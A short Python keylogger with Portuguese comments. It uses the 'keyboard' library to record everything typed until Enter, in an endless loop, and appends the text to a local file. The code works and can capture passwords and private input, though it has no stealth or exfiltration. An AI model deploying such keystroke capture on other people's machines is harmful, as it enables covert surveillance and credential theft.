# Importando o módulo teclado (para capturar teclas)
import keyboard

# Criando o arquivo com o texto digitado
arquivo = "digitado.txt"

while True:
    with open(arquivo, 'a') as data_file:
        
        # Gravo tudo até a tecla "enter" ser digitada
        digitado = keyboard.record('enter')
        texto = list(keyboard.get_typed_strings(digitado))
        
        data_file.write('\n') 
        # Separo o texto do que foi digitado do resto da informação
        data_file.write(texto[0])